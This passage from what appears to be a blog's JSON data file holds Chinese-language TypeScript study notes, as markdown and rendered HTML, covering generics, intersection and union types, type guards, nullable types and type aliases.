class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> TI&lt;T&gt; &#123;</span><br><span class=\"line\">    (arg: T): T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> output: TI&lt;<span class=\"built_in\">number</span>&gt; = identity;</span><br></pre></td></tr></table></figure>\n<p><strong>泛型约束的继承使用</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> L &#123;</span><br><span class=\"line\">    length: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 泛型变量 T 继承自接口 L</span></span><br><span class=\"line\"><span class=\"comment\">// 泛型变量 T 必定含有一个 length 属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">identity</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> <span class=\"title\">L</span>&gt;(<span class=\"params\">arg: T</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(arg.length)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arg.length</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">identity(<span class=\"number\">3</span>); <span class=\"comment\">// -&gt; error，现在泛型函数 identity 的参数被 L 约束</span></span><br><span class=\"line\"></span><br><span class=\"line\">identity(&#123;value: <span class=\"number\">3</span>, length: <span class=\"number\">1</span>&#125;) <span class=\"comment\">// -&gt; success</span></span><br></pre></td></tr></table></figure>\n<p><strong>在泛型约束中使用类型参数</strong><br>这里直接引用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getProperty</span>(<span class=\"params\">obj: T, key: K</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj[key];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> x = &#123; a: <span class=\"number\">1</span>, b: <span class=\"number\">2</span>, c: <span class=\"number\">3</span>, d: <span class=\"number\">4</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">getProperty(x, <span class=\"string\">\"a\"</span>); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\">getProperty(x, <span class=\"string\">\"m\"</span>); <span class=\"comment\">// -&gt; error，x 里面没有 'm' 这个 key</span></span><br></pre></td></tr></table></figure>\n<p><strong>在泛型里使用类类型</strong><br>这里直接引用官方的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> BeeKeeper &#123;</span><br><span class=\"line\">    hasMask: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> ZooKeeper &#123;</span><br><span class=\"line\">    nametag: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Animal &#123;</span><br><span class=\"line\">    numLegs: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Bee <span class=\"keyword\">extends</span> Animal &#123;</span><br><span class=\"line\">    keeper: BeeKeeper;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Lion <span class=\"keyword\">extends</span> Animal &#123;</span><br><span class=\"line\">    keeper: ZooKeeper;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// createInstance </span></span><br><span class=\"line\"><span class=\"comment\">// 参数: c: new () =&gt; A 指 参数c 为一个 可以实例化的构造函数</span></span><br><span class=\"line\"><span class=\"comment\">// 且实例化之后的函数类型被 变量类型 A</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createInstance</span>&lt;<span class=\"title\">A</span> <span class=\"title\">extends</span> <span class=\"title\">Animal</span>&gt;(<span class=\"params\">c: <span class=\"keyword\">new</span> () =&gt; A</span>): <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> c();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">createInstance(Lion).keeper.nametag;</span><br><span class=\"line\">createInstance(Bee).keeper.hasMask;</span><br></pre></td></tr></table></figure>\n<h4 id=\"泛型类\"><a href=\"#泛型类\" class=\"headerlink\" title=\"泛型类\"></a>泛型类</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Demo&lt;T&gt; &#123;</span><br><span class=\"line\">    prop: T;</span><br><span class=\"line\">    add: <span class=\"function\">(<span class=\"params\">x: T, y: T</span>) =&gt;</span> T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> d = <span class=\"keyword\">new</span> Demo&lt;<span class=\"built_in\">number</span>&gt;();</span><br><span class=\"line\">d.prop = <span class=\"number\">10</span>;</span><br><span class=\"line\">d.add = <span class=\"function\">(<span class=\"params\">x, y</span>) =&gt;</span> x + y;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还是老样子</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>"},{"title":"Typescript学习日记（八）","date":"2017-02-23T09:41:17.000Z","_content":"\n本文主要介绍 `typescript` 几种高级类型及相关内容。\n<!-- more -->\n\n### 高级类型\n\n#### 交叉类型(Intersection Types)\n\n交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。\n我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。\n简单的说：将多个类型进行并集操作，目标类型必须满足合并之后的所有类型。\n\n```ts\n// 添加类型 T、U，指定返回值类型必须符合 T 且符合 U\nfunction extend<T, U>(first: T, second: U): T & U {\n    let result = <T & U>{};\n    for (let id in first) {\n        (<any>result)[id] = (<any>first)[id];\n    }\n    for (let id in second) {\n        if (!result.hasOwnProperty(id)) {\n            (<any>result)[id] = (<any>second)[id];\n        }\n    }\n    return result;\n}\n\nclass Person {\n    constructor(public name: string) { }\n}\ninterface Loggable {\n    log(): void;\n}\nclass ConsoleLogger implements Loggable {\n    log() {\n        // ...\n    }\n}\n\n// 混合 Person 类和 ConsoleLogger 类\n// 生成的 jim 包含两个父类的所有属性和方法\nvar jim = extend(new Person(\"Jim\"), new ConsoleLogger());\nvar n = jim.name;\njim.log();\n```\n\n#### 联合类型(Union Types)\n\n如果把 `交叉类型` 用 `&` 符号标示，那么 `联合类型` 就是 `|`;\n如果一个值是联合类型，**我们只能访问此联合类型的所有类型里`共有的成员`**。\n\n```ts\ninterface Bird {\n    fly();\n    layEggs();\n}\n\ninterface Fish {\n    swim();\n    layEggs();\n}\n\nfunction getSmallPet(): Fish | Bird {\n    // ...\n}\n\nlet pet = getSmallPet();\npet.layEggs(); // -> success，Bird U Fish 求交集，共有成员为 layEggs\npet.swim();    // -> error\n```\n\n#### 类型保护与区分类型(Type Guards and Differentiating Types)\n\n#### 用户自定义的类型保护\n\n类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。 要定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个 `类型谓词`。\n\n```ts\nfunction isFish(pet: Fish | Bird): pet is Fish {\n    return (<Fish>pet).swim !== undefined;\n}\n\n// (<Fish>pet)  在这里表示强制类型转换\n```\n\n上述，`pet is Fish` 就是类型谓词。 谓词为 `parameterName is Type` 这种形式，`parameterName` 必须是来自于当前函数签名里的一个参数名。\n\n\n#### typeof 类型保护\n\n```ts\nfunction isNumber(x: any): x is number {\n    return typeof x === \"number\";\n}\n\nfunction isString(x: any): x is string {\n    return typeof x === \"string\";\n}\n\nfunction padLeft(value: string, padding: string | number) {\n    if (isNumber(padding)) {\n        return Array(padding + 1).join(\" \") + value;\n    }\n    if (isString(padding)) {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got '${padding}'.`);\n}\n```\n\n我们不必将 `typeof x === \"number\"` 抽象成一个函数，因为TypeScript可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了。\n\n重写上面的代码：\n\n```ts\nfunction padLeft(value: string, padding: string | number) {\n    if (typeof padding === \"number\") { // 直接使用 typeof 判断\n        return Array(padding + 1).join(\" \") + value;\n    }\n    if (typeof padding === \"string\") {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got '${padding}'.`);\n}\n```\n\n这些 `typeof类型保护` 只有两种形式能被识别： `typeof v === \"typename\"` 和 `typeof v !== \"typename\"`， `\"typename\"` 必须是 `\"number\"`， `\"string\"`， `\"boolean\"` 或 `\"symbol\"`。\n\n#### instanceof 类型保护\n\n与 `javascript` 中的类似，`instanceof` 类型保护是通过构造函数来细化类型的一种方式。\n这里直接使用官方例子：\n\n```ts\ninterface Padder {\n    getPaddingString(): string\n}\n\nclass SpaceRepeatingPadder implements Padder {\n    constructor(private numSpaces: number) { }\n    getPaddingString() {\n        return Array(this.numSpaces + 1).join(\" \");\n    }\n}\n\nclass StringPadder implements Padder {\n    constructor(private value: string) { }\n    getPaddingString() {\n        return this.value;\n    }\n}\n\nfunction getRandomPadder() {\n    return Math.random() < 0.5 ?\n        new SpaceRepeatingPadder(4) :\n        new StringPadder(\"  \");\n}\n\n// 类型为SpaceRepeatingPadder | StringPadder\nlet padder: Padder = getRandomPadder();\n\nif (padder instanceof SpaceRepeatingPadder) {\n    padder; // 类型细化为'SpaceRepeatingPadder'\n}\nif (padder instanceof StringPadder) {\n    padder; // 类型细化为'StringPadder'\n}\n```\n\n### 可以为 null 的类型\n\n`TypeScript` 具有两种特殊的类型， `null` 和 `undefined`，它们分别具有值**null**和**undefined**。\n默认情况下，类型检查器认为 `null` 与 `undefined` 可以赋值给任何类型。 `null` 与 `undefined` 是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。\n\n\n#### 可选参数与可选属性\n\n使用了 `--strictNullChecks`，`可选参数`会被自动地加上 `| undefined`。\n\n```ts\nfunction f(x: number, y?: number) { // -> (x: number, y?: number | undefined)\n    return x + (y || 0);\n}\nf(1, 2);\nf(1);\nf(1, undefined); // 注意，是可选参数，不是参数\nf(1, null); // error, null !== undefined\n```\n\n同理，`可选属性` 中也是同样的结果：\n\n```ts\nclass C {\n    a: number;\n    b?: number;\n}\nlet c = new C();\nc.a = 12;\nc.b = 13;\nc.b = undefined; // ok\nc.b = null; // error, null !== undefined\n```\n\n#### 类型保护和类型断言\n\n由于可以为null的类型是通过联合类型实现，那么你需要使用类型保护来去除 `null`。\n\n```ts\nfunction f(sn: string | null): string {\n    return sn || \"default\";\n}\n```\n\n如果编译器不能够去除 `null` 或 `undefined`，你可以使用 `类型断言` 手动去除。 语法是添加 `!` 后缀:\n例如：\n`identifier!` 表示从 `identifier` 的类型里去除了 `null` 和 `undefined`。\n\n### 类型别名\n\n类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。\n**起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型**。\n\n```ts\ntype Name = string; // string 重命名为 Name\ntype NameResolver = () => string; // 同上..\ntype NameOrResolver = Name | NameResolver;\nfunction getName(n: NameOrResolver): Name {\n    if (typeof n === 'string') {\n        return n;\n    }\n    else {\n        return n();\n    }\n}\n```\n\n#### 类型别名(type) vs 接口(interface)\n\n1. 接口创建了一个新的名字，可以在其它任何地方使，类型别名并不创建新名字。\n2. 类型别名不能被 `extends` 和 `implements`(自己也不能 `extends` 和 `implements` 其它类型)。\n3. 如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。\n\n","source":"_posts/Typescript学习日记（八）.md","raw":"---\ntitle: Typescript学习日记（八）\ndate: 2017-02-23 17:41:17\ntags:\n---\n\n本文主要介绍 `typescript` 几种高级类型及相关内容。\n<!-- more -->\n\n### 高级类型\n\n#### 交叉类型(Intersection Types)\n\n交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。\n我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。\n简单的说：将多个类型进行并集操作，目标类型必须满足合并之后的所有类型。\n\n```ts\n// 添加类型 T、U，指定返回值类型必须符合 T 且符合 U\nfunction extend<T, U>(first: T, second: U): T & U {\n    let result = <T & U>{};\n    for (let id in first) {\n        (<any>result)[id] = (<any>first)[id];\n    }\n    for (let id in second) {\n        if (!result.hasOwnProperty(id)) {\n            (<any>result)[id] = (<any>second)[id];\n        }\n    }\n    return result;\n}\n\nclass Person {\n    constructor(public name: string) { }\n}\ninterface Loggable {\n    log(): void;\n}\nclass ConsoleLogger implements Loggable {\n    log() {\n        // ...\n    }\n}\n\n// 混合 Person 类和 ConsoleLogger 类\n// 生成的 jim 包含两个父类的所有属性和方法\nvar jim = extend(new Person(\"Jim\"), new ConsoleLogger());\nvar n = jim.name;\njim.log();\n```\n\n#### 联合类型(Union Types)\n\n如果把 `交叉类型` 用 `&` 符号标示，那么 `联合类型` 就是 `|`;\n如果一个值是联合类型，**我们只能访问此联合类型的所有类型里`共有的成员`**。\n\n```ts\ninterface Bird {\n    fly();\n    layEggs();\n}\n\ninterface Fish {\n    swim();\n    layEggs();\n}\n\nfunction getSmallPet(): Fish | Bird {\n    // ...\n}\n\nlet pet = getSmallPet();\npet.layEggs(); // -> success，Bird U Fish 求交集，共有成员为 layEggs\npet.swim();    // -> error\n```\n\n#### 类型保护与区分类型(Type Guards and Differentiating Types)\n\n#### 用户自定义的类型保护\n\n类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。 要定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个 `类型谓词`。\n\n```ts\nfunction isFish(pet: Fish | Bird): pet is Fish {\n    return (<Fish>pet).swim !== undefined;\n}\n\n// (<Fish>pet)  在这里表示强制类型转换\n```\n\n上述，`pet is Fish` 就是类型谓词。 谓词为 `parameterName is Type` 这种形式，`parameterName` 必须是来自于当前函数签名里的一个参数名。\n\n\n#### typeof 类型保护\n\n```ts\nfunction isNumber(x: any): x is number {\n    return typeof x === \"number\";\n}\n\nfunction isString(x: any): x is string {\n    return typeof x === \"string\";\n}\n\nfunction padLeft(value: string, padding: string | number) {\n    if (isNumber(padding)) {\n        return Array(padding + 1).join(\" \") + value;\n    }\n    if (isString(padding)) {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got '${padding}'.`);\n}\n```\n\n我们不必将 `typeof x === \"number\"` 抽象成一个函数，因为TypeScript可以将它识别为一个类型保护。 也就是说我们可以直接在代码里检查类型了。\n\n重写上面的代码：\n\n```ts\nfunction padLeft(value: string, padding: string | number) {\n    if (typeof padding === \"number\") { // 直接使用 typeof 判断\n        return Array(padding + 1).join(\" \") + value;\n    }\n    if (typeof padding === \"string\") {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got '${padding}'.`);\n}\n```\n\n这些 `typeof类型保护` 只有两种形式能被识别： `typeof v === \"typename\"` 和 `typeof v !== \"typename\"`， `\"typename\"` 必须是 `\"number\"`， `\"string\"`， `\"boolean\"` 或 `\"symbol\"`。\n\n#### instanceof 类型保护\n\n与 `javascript` 中的类似，`instanceof` 类型保护是通过构造函数来细化类型的一种方式。\n这里直接使用官方例子：\n\n```ts\ninterface Padder {\n    getPaddingString(): string\n}\n\nclass SpaceRepeatingPadder implements Padder {\n    constructor(private numSpaces: number) { }\n    getPaddingString() {\n        return Array(this.numSpaces + 1).join(\" \");\n    }\n}\n\nclass StringPadder implements Padder {\n    constructor(private value: string) { }\n    getPaddingString() {\n        return this.value;\n    }\n}\n\nfunction getRandomPadder() {\n    return Math.random() < 0.5 ?\n        new SpaceRepeatingPadder(4) :\n        new StringPadder(\"  \");\n}\n\n// 类型为SpaceRepeatingPadder | StringPadder\nlet padder: Padder = getRandomPadder();\n\nif (padder instanceof SpaceRepeatingPadder) {\n    padder; // 类型细化为'SpaceRepeatingPadder'\n}\nif (padder instanceof StringPadder) {\n    padder; // 类型细化为'StringPadder'\n}\n```\n\n### 可以为 null 的类型\n\n`TypeScript` 具有两种特殊的类型， `null` 和 `undefined`，它们分别具有值**null**和**undefined**。\n默认情况下，类型检查器认为 `null` 与 `undefined` 可以赋值给任何类型。 `null` 与 `undefined` 是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。\n\n\n#### 可选参数与可选属性\n\n使用了 `--strictNullChecks`，`可选参数`会被自动地加上 `| undefined`。\n\n```ts\nfunction f(x: number, y?: number) { // -> (x: number, y?: number | undefined)\n    return x + (y || 0);\n}\nf(1, 2);\nf(1);\nf(1, undefined); // 注意，是可选参数，不是参数\nf(1, null); // error, null !== undefined\n```\n\n同理，`可选属性` 中也是同样的结果：\n\n```ts\nclass C {\n    a: number;\n    b?: number;\n}\nlet c = new C();\nc.a = 12;\nc.b = 13;\nc.b = undefined; // ok\nc.b = null; // error, null !== undefined\n```\n\n#### 类型保护和类型断言\n\n由于可以为null的类型是通过联合类型实现，那么你需要使用类型保护来去除 `null`。\n\n```ts\nfunction f(sn: string | null): string {\n    return sn || \"default\";\n}\n```\n\n如果编译器不能够去除 `null` 或 `undefined`，你可以使用 `类型断言` 手动去除。 语法是添加 `!` 后缀:\n例如：\n`identifier!` 表示从 `identifier` 的类型里去除了 `null` 和 `undefined`。\n\n### 类型别名\n\n类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。\n**起别名不会新建一个类型 - 它创建了一个新名字来引用那个类型**。\n\n```ts\ntype Name = string; // string 重命名为 Name\ntype NameResolver = () => string; // 同上..\ntype NameOrResolver = Name | NameResolver;\nfunction getName(n: NameOrResolver): Name {\n    if (typeof n === 'string') {\n        return n;\n    }\n    else {\n        return n();\n    }\n}\n```\n\n#### 类型别名(type) vs 接口(interface)\n\n1. 接口创建了一个新的名字，可以在其它任何地方使，类型别名并不创建新名字。\n2. 类型别名不能被 `extends` 和 `implements`(自己也不能 `extends` 和 `implements` 其它类型)。\n3. 如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。\n\n","slug":"Typescript学习日记（八）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qj000902vsfi6v5cnk","content":"<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br><a id=\"more\"></a></p>\n<h3 id=\"高级类型\"><a href=\"#高级类型\" class=\"headerlink\" title=\"高级类型\"></a>高级类型</h3><h4 id=\"交叉类型-Intersection-Types\"><a href=\"#交叉类型-Intersection-Types\" class=\"headerlink\" title=\"交叉类型(Intersection Types)\"></a>交叉类型(Intersection Types)</h4><p>交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。<br>我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。<br>简单的说：将多个类型进行并集操作，目标类型必须满足合并之后的所有类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加类型 T、U，指定返回值类型必须符合 T 且符合 U</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">extend</span>&lt;<span class=\"title\">T</span>, <span class=\"title\">U</span>&gt;(<span class=\"params\">first: T, second: U</span>): <span class=\"title\">T</span> &amp; <span class=\"title\">U</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = &lt;T &amp; U&gt;&#123;&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> id <span class=\"keyword\">in</span> first) &#123;</span><br><span class=\"line\">        (&lt;<span class=\"built_in\">any</span>&gt;result)[id] = (&lt;<span class=\"built_in\">any</span>&gt;first)[id];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> id <span class=\"keyword\">in</span> second) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!result.hasOwnProperty(id)) &#123;</span><br><span class=\"line\">            (&lt;<span class=\"built_in\">any</span>&gt;result)[id] = (&lt;<span class=\"built_in\">any</span>&gt;second)[id];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Person &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">public</span> name: <span class=\"built_in\">string</span></span>) &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Loggable &#123;</span><br><span class=\"line\">    log(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> ConsoleLogger <span class=\"keyword\">implements</span> Loggable &#123;</span><br><span class=\"line\">    log() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 混合 Person 类和 ConsoleLogger 类</span></span><br><span class=\"line\"><span class=\"comment\">// 生成的 jim 包含两个父类的所有属性和方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> jim = extend(<span class=\"keyword\">new</span> Person(<span class=\"string\">\"Jim\"</span>), <span class=\"keyword\">new</span> ConsoleLogger());</span><br><span class=\"line\"><span class=\"keyword\">var</span> n = jim.name;</span><br><span class=\"line\">jim.log();</span><br></pre></td></tr></table></figure>\n<h4 id=\"联合类型-Union-Types\"><a href=\"#联合类型-Union-Types\" class=\"headerlink\" title=\"联合类型(Union Types)\"></a>联合类型(Union Types)</h4><p>如果把 <code>交叉类型</code> 用 <code>&amp;</code> 符号标示，那么 <code>联合类型</code> 就是 <code>|</code>;<br>如果一个值是联合类型，<strong>我们只能访问此联合类型的所有类型里<code>共有的成员</code></strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Bird &#123;</span><br><span class=\"line\">    fly();</span><br><span class=\"line\">    layEggs();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Fish &#123;</span><br><span class=\"line\">    swim();</span><br><span class=\"line\">    layEggs();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getSmallPet</span>(<span class=\"params\"></span>): <span class=\"title\">Fish</span> | <span class=\"title\">Bird</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> pet = getSmallPet();</span><br><span class=\"line\">pet.layEggs(); <span class=\"comment\">// -&gt; success，Bird U Fish 求交集，共有成员为 layEggs</span></span><br><span class=\"line\">pet.swim();    <span class=\"comment\">// -&gt; error</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"类型保护与区分类型-Type-Guards-and-Differentiating-Types\"><a href=\"#类型保护与区分类型-Type-Guards-and-Differentiating-Types\" class=\"headerlink\" title=\"类型保护与区分类型(Type Guards and Differentiating Types)\"></a>类型保护与区分类型(Type Guards and Differentiating Types)</h4><h4 id=\"用户自定义的类型保护\"><a href=\"#用户自定义的类型保护\" class=\"headerlink\" title=\"用户自定义的类型保护\"></a>用户自定义的类型保护</h4><p>类型保护就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。 要定义一个类型保护，我们只要简单地定义一个函数，它的返回值是一个 <code>类型谓词</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isFish</span>(<span class=\"params\">pet: Fish | Bird</span>): <span class=\"title\">pet</span> <span class=\"title\">is</span> <span class=\"title\">Fish</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (&lt;Fish&gt;pet).swim !== <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// (&lt;Fish&gt;pet)  在这里表示强制类型转换</span></span><br></pre></td></tr></table></figure>\n<p>上述，<code>pet is Fish</code> 就是类型谓词。 谓词为 <code>parameterName is Type</code> 这种形式，<code>parameterName</code> 必须是来自于当前函数签名里的一个参数名。</p>\n<h4 id=\"typeof-类型保护\"><a href=\"#typeof-类型保护\" class=\"headerlink\" title=\"typeof 类型保护\"></a>typeof 类型保护</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 